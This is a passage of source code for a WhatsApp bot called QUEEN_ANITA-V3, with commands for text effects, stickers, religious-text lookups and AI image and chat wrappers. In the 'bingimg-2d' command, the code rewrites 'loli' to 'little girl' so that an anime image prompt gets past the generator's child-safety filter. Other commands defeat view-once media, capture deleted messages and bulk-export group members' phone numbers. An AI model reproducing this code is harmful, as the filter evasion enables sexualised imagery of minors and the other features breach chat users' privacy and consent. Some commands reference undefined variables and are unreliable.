throw `Content-Length: ${res.headers.get('content-length')}`
}
if (!/text|json/.test(res.headers.get('content-type'))) return ptz.sendFile(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2024 © David Cyril`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
reply(txt.slice(0, 65536) + '')
}
}
break

case 'ss':
case 'ssweb':{
if (!text) return reply(`where is the link?`)
await ptz.sendMessage(m?.chat, {react: {text: `📷`,key: m?.key,}})
await ptz.sendMessage(m?.chat, {react: {text: `📸`,key: m?.key,}})
try {
ptz.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=nanogembul` }}, { quoted: m})
			} catch {
	  reply('`Error!`')
	}
}
break

case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {

if (!q) return reply(`Example : ${prefix+command} David Cyril`) 
await loading() 
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
ptz.sendMessage(m.chat, { image: { url: anu }, caption: `Done!` }, { quoted: m })
}
break

case 'convertime':
    const [dime, fromZone, toZone] = args;
    if (!dime || !fromZone || !toZone) return reply('Usage: .convertime [time] [from timezone] [to timezone]');
    const fromdime = moment.tz(dime, fromZone);
    if (!fromdime.isValid()) return reply('Invalid time or timezone.');
    const todime = fromdime.clone().tz(toZone);
    reply(`Time in ${toZone}: ${todime.format('HH:mm:ss')}`);
    break;
 

case 'flipcoin': case 'coin': {
        ptz.sendMessage(from, { react: { text: "🪙", key: m.key } });
        // Simulate flipping a coin (0 for heads, 1 for tails)
        const result = Math.random() < 0.5 ? 'Heads' : 'Tails';

        const flipCoinMessage = `🪙 *Coin Flip Result: ${result}*`;
        reply(flipCoinMessage);
      }
        break; 
        
case 'dice': case 'roll': {
        ptz.sendMessage(from, { react: { text: "🎲", key: m.key } })
        const result = Math.floor(Math.random() * 6) + 1; // Generate a random number between 1 and 6

        const diceMessage = `🎲 *Dice Roll Result:* ${result}`;

        reply(diceMessage);
      }
        break;   
        
case 'listonline': case 'listactive': case 'here': {
       
        await ptz.sendMessage(m?.chat, {react: {text: `🎙`,key: m?.key,}})

        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        ptz.sendText(m.chat, '  「 *Online Members* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
        break; 

case 'couplepp': case 'ppcouple': {
await ptz.sendMessage(m?.chat, {react: {text: `🫶`,key: m?.key,}})
await loading() 
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
ptz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
ptz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break

//=================================================//

case 'pickupline': {
await ptz.sendMessage(m?.chat, {react: {text: `💝`,key: m?.key,}}) 
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '\n©David-Cyril'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: true,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg')}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: ' • QUEEN_ANITA-V3 •',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  


// Add the command to enable or disable welcome messages

  

case 'vv': case 'readviewonce': {
if (!m?.quoted) return reply('reply the image/video you want to see')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message..')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@adiwajshing/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return ptz.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return ptz.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break

case 'vv2': case 'readviewonce2': {
if (!isCreator) return reply(`For My Owner Only Stupid`) 
    if (!m?.quoted) return reply('Reply to the image/video you want to view.');
    if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message.');

    let msg = m?.quoted.message;
    let type = Object.keys(msg)[0];
    const { downloadContentFromMessage } = require('@adiwajshing/baileys');
    
    let media = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');
    let buffer = Buffer.from([]);
    
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk]);
    }

    // Get the ID of the user who executed the command
    let userWhatsAppID = m?.sender;

    if (/video/.test(type)) {
        return ptz.sendFile(userWhatsAppID, buffer, 'media.mp4', msg[type].caption || '', m);
    } else if (/image/.test(type)) {
        return ptz.sendFile(userWhatsAppID, buffer, 'media.jpg', msg[type].caption || '', m);
    }
}
break;

case 'lyrics': {
if (!args[0]) return reply("Give me a song name")
await ptz.sendMessage(m?.chat, {react: {text: `🎼`,key: m?.key,}}) 
reply('`Searching...`') 
let d = await fetchJson(`https://api.popcat.xyz/lyrics?song=${args[0]}`)
ptz.sendMessage(m.chat, { text: d.lyrics})
}
break


case 'periodic-table': {
if (!args[0]) return reply("Give me a chemical element!")
await ptz.sendMessage(m?.chat, {react: {text: `⏳`,key: m?.key,}}) 
reply('`Searching...`') 
let e = await fetchJson(`https://api.popcat.xyz/periodic-table?element=${args[0]}`)
let el = `${e.name}`;
let eq = `${e.phase}`;
let es = `${e.symbol}`;
let ek = `${e.atomic_number}`; 
let ep = `${e.summary}`;  

 const pts = `*Name:* ${el}\n *Symbol:* ${es}\n *Phase:* ${eq}\n *Atomic_Number*${ek}\n *Summary* ${ep}`;
 
    await ptz.sendMessage(m.chat, { 
      image: { url: e.image },  
      caption: pts 
    }, { quoted: m });
}
break





  case 'bible': {
  	
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'Queen_Anita-V3'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: true,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg')}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"AMEN🙏\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '©',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
  break

 case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      return reply(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      return reply(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}\n\n © ᴅᴀᴠɪᴅ ᴄʏʀɪʟ`

    reply(quranSurah)

    if (json.data.recitation.full) {
      ptz.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
  break

case 'song2':
if (!text) return reply('Example: Play Faded by Alan Walker'); 
try {
 let sections = [{
		title: '- SELECT-', 
		rows: [{
	 title: '[ VIDEO ]',
 	description: `_*Playing  ${result.title}.....`, 
 	id: `${prefix}video`
 }, 
 {
 title: ' [ AUDIO 🎧 ]',
 description: "Playing....",
 id: `${prefix}play${text}`
 }]
}]

let listMessage = {
title: 'SELECT',
 sections
};

let msghhhhhhhhhhhhhhhhhhhk = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m?.sender],
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '12036326753195844@newsletter',
 newsletterName: `QUEEN_ANITA-V3 • ${runtime(process.uptime())}`,
 serverMessageId: -1
 },
 businessMessageForwardInfo: {
 businessOwnerJid: ptz.decodeJid(ptz.user.id)
 },
 externalAdReply: {
 title: '⟡ Q U E E N  • A N I T A - V 1 ⟡',
 body: " Music Player ",
 thumbnailUrl: "https://imgur.com/a/PD8nT5X",
 sourceUrl: '',
 mediaType: 1,
 renderLargerThumbnail: true
 }
 },
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© David-Cyril `
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 thumbnailUrl: "",
 gifPlayback: true,
 subtitle: "QUEEN_ANITA-V3",
 hasMediaAttachment: false,
 /*...(await prepareWAMessageMedia({
 document: fs.readFileSync('./package.json'),
 mimetype: "application/msword",
 jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: "QUEEN_ANITA-V3™",
 }, {
 upload: ptz.waUploadToServer
 }))*/
 }),
 gifPlayback: true,
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage)
 }]
 })
 })
 }
 }
}, {
 quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhhk.key.remoteJid, msghhhhhhhhhhhhhhhhhhhk.message, {
 messageId: msghhhhhhhhhhhhhhhhhhhk.key.id
});
await ptz.sendMessage(m.chat, { 
      image: { url: result.thumbnail },  
      caption: teks 
    }, { quoted: m });

    // Fetch audio data from the provided API
    let load = await (await fetch(`https://nue-api.vercel.app/api/play?query=${result.url}`)).json();
    
    // Check if the audio URL exists in the response
    if (load && load.download && load.download.audio) {
      let audioUrl = load.download.audio;

      // Send the audio file
      await ptz.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mp4', 
      }, { quoted: m });
    } else {
      // Handle the case where audio URL is not available
      reply('Error! Audio download URL not found in the response.');
    }
  } catch (error) {
    // Log the error for better debugging
    console.error(error);
    reply('`Error! `');
  }
break 




case 'message-revoke-receipt': case 'message-receipt-update': {
    let participant = m?.participant || m?.key?.participant;

    for (let userWhatsAppID in antiDeleteUsers) {
        if (antiDeleteUsers[userWhatsAppID] && m.message) {
            let messageType = Object.keys(m.message)[0];
            const { downloadContentFromMessage } = require('@adiwajshing/baileys');

            // Check if the message is of a type that can be forwarded (text, image, video, etc.)
            if (messageType === 'conversation') {
                // If it's a text message
                let text = m.message.conversation;
                await ptz.sendMessage(global.db.data.users, { text: `Deleted message by @${participant.split('@')[0]}: ${text}` }, { mentions: [participant] });
            } else if (messageType === 'imageMessage' || messageType === 'videoMessage') {
                // If it's an image or video message
                let media = await downloadContentFromMessage(m.message[messageType], messageType === 'imageMessage' ? 'image' : 'video');
                let buffer = Buffer.from([]);
                for await (const chunk of media) {
                    buffer = Buffer.concat([buffer, chunk]);
                }

                if (messageType === 'imageMessage') {
                    await ptz.sendFile(userWhatsAppID, buffer, 'image.jpg', `Deleted image by @${participant.split('@')[0]}`, m, { mentions: [participant] });
                } else if (messageType === 'videoMessage') {
                    await ptz.sendFile(userWhatsAppID, buffer, 'video.mp4', `Deleted video by @${participant.split('@')[0]}`, m, { mentions: [participant] });
                }
            } else if (messageType === 'extendedTextMessage') {
                // If it's a forwarded message or a message with a quoted reply
                let text = m.message.extendedTextMessage.text;
                await ptz.sendMessage(global.db.data.users, { text: `Deleted extended message by @${participant.split('@')[0]}: ${text}` }, { mentions: [participant] });
            }
            // Add more conditions if you want to handle other types of messages (audio, stickers, etc.)
        }
    }
}
break;


//=================================================//
case 'qc': {
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else reply("Input text or reply text that you want to make a quote!")
if (!text) return reply('Input text')
if (text.length > 30) return reply('Maximum 30 Teks!')
let ppnyauser = await await ptz.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
ptz.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break
//=================================================//

case 'savecontact': case 'svcontact':{
if (!m.isGroup) return reply(`For Groups Only`) 
if (!(isBotAdmins || isCreator)) return reply(`For Admin Only`) 
let cmiggc = await ptz.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
reply('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
ptz.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break


            

case 'smeme': {
let respond = `Send/reply image/sticker with caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return reply(respond)
if (!text) return reply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ptz.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await ptz.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} catch (e) {
}
}
break



 //=================================================//
case 'swm': {
let [teks1, teks2] = text.split`|`
if (!teks1) return reply(`Send/reply image/sticker with caption ${prefix + command} text1|text2`)
if (!teks2) return reply(`Send/reply image/sticker with caption ${prefix + command} text1|text2`)
if (/image/.test(mime)) {
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Second!')
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else {
return reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break
//=================================================//
case "bingimg-2d": {
if (!text) return reply("[ ! ] Enter the image prompt you want to create");
let teksu = text.replace(/loli/gi, "little girl");
try {
const { BingApi, apikeybing } = require('./lib/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
ptz.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted:fsaluran });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await reply('No images found after filtering.');
}
} catch (error) {
await reply('An error occurred while processing the request.');
}
};
break
//=================================================//
case "ping": case "speed": { 
let timestamp = speed()
let latensi = speed() - timestamp
await ptz.sendMessage(m?.chat, {react: {text: `⚡`,key: m?.key,}}) 
         reply (`_*ANITA-V3 SPEED = > : ${latensi.toFixed(4)}ms*_`); 
         } 
 break
  
case "uptime": case "runtime": { 
 await ptz.sendMessage(m?.chat, {react: {text: `✨`,key: m?.key,}})
                 reply (`_*QUEEN_ANITA-V3 Has Been Running For ${runtime(process.uptime())}*_`) 
 } 
 break

case 'dalle': case 'dall-e':
if (!text) return reply("*`Input query`*\nExample: .dall-e rain")
dallres = `https://widipe.com/v5/text2img?text=${text}`
 ptz.sendMessage(m.chat, {
 image: {url: dallres},
 caption: `${text}`
 },{quoted:fsaluran })
break

          case 'delete': case 'del': case 'd':{
          
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 ptz.sendMessage(m.chat, { delete: key })
}
break

case 'leavegc': {
if (!isCreator) return reply('`This Command Is For My Owner Only`')
await ptz.groupLeave(m.chat)
await reply('`Done!`')
            }
            break

case "gptgo": {
if (!text) return reply (`*Example : ${prefix + command} Hello*`)
var js = await fetch(`https://widipe.com/gptgo?text=${q}`) 
var json = await js.json()
let que = "`"
reply(`${que}Gpt-Go${que}\n\n ${json.result}`)
}
break





case 'bingai': case 'bing-ai': {
if (text === 'loli') {
reply('Are you pedantic??')
} else if (text === 'furry') {
reply('funny')
} else {
reply('Input Query\n\nEdample: .bing-ai Hallo')
}

const bing = await fetchJson(`https://widipe.com/bingai?text=${text}`)
const sult = bing.result
reply(sult)
}
break


case 'tess':
reply('QUEEN_ANITA-V3 is Online')
break



case 'use-power':
let pewer = "*`[ POWER - SELECT ]`*\n\n• .power-energy\n• .power-crown\n\n*More ? Coming Soon*"
reply(pewer)
break



case 'nevo':{
if (!text) return reply('What do you want to ask?')
let dataa = await fetchJson(`https://ai.nevolution.team/nevo?apikey=akbarrdev&prompt=${text}`)
let unvo = dataa.response
reply(unvo)
} 
break

case 'abro-movie':{
if (!text) return reply(`Example: ${prefix + command} jumanji`)
let jennifer = await fetchJson(`https://abro-rest-api.onrender.com/api/film/search?q=${text}&apikey=abrotech`)
let babe = jennifer.results
let anita = jennifer.relTag
let exanita = jennifer.link
let imissanita = jennifer.title
const bby = `*Name:* ${imissanita}\n *Type:* ${anita}\n *Link:* ${exanita}`;
       reply(bby) 
}
break



case "sewabot": case "sewa": {




const url1 = `https://telegra.ph/file/75c6e28f260ff0a097d51.jpg`;
const url2 = `https://telegra.ph/file/6b6ce5375927b4b248974.jpg`;
const url3 = `https://telegra.ph/file/e06b30b4c26c9990ce948.jpg`;

async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: ptz.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
